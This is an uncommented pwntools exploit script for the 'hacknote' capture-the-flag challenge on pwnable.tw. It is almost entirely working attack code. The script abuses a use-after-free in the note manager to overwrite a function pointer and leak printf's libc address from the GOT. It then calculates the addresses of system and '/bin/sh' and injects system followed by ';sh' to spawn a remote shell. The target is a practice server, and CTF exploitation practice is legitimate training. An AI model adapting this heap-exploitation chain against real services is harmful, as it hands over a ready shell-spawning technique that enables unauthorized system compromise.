from pwn import *

DEBUG = False

if DEBUG:
    gs = """
    define hook-stop
    x/5wx 0x804A050
    echo ----------------------------------------------------------------------------
    x/64wx *0x804A050
    end

    b *0x8048AA7
    """
    # io = gdb.debug("./hacknote", gdbscript=gs)
    io = process("./hacknote")
else:
    io = remote("chall.pwnable.tw", 10102)

def add_note(content_size, content):
    io.recvuntil(b'choice :')
    io.sendline(b'1')
    io.recvuntil(b'size :')
    io.sendline(str(content_size).encode())
    io.recvuntil(b'Content :')
    io.sendline(content)

def delete_note(note_index):
    io.recvuntil(b'choice :')
    io.sendline(b'2')
    io.recvuntil(b'Index :')
    io.sendline(str(note_index).encode())

def print_note(note_index):
    io.recvuntil(b'choice :')
    io.sendline(b'3')
    io.recvuntil(b'Index :')
    io.sendline(str(note_index).encode())

add_note(16, b'A'*15)
add_note(16, b'A'*15)
delete_note(1)
delete_note(0)

puts_note_addr = 0x804862B
got_plt_printf_entry = 0x804A010
add_note(8, p32(puts_note_addr) + p32(got_plt_printf_entry))
print_note(1)

printf_leaked_addr = u32(io.recv(4))
print("printf_leaked_addr:", hex(printf_leaked_addr))

if DEBUG:
    libc_base_addr = printf_leaked_addr - 0x54340
    system_addr = libc_base_addr + 0x045830
    binsh_addr  = libc_base_addr + 0x192352
else:
    libc_base_addr = printf_leaked_addr - 0x49020
    system_addr = libc_base_addr + 0x03a940
    binsh_addr  = libc_base_addr + 0x158e8b

print("libc_base_addr:", hex(libc_base_addr))
print("system_addr:", hex(system_addr))
print("binsh_addr:", hex(binsh_addr))

delete_note(2)
add_note(8, p32(system_addr) + b';sh\x00')
print_note(1)

io.interactive()
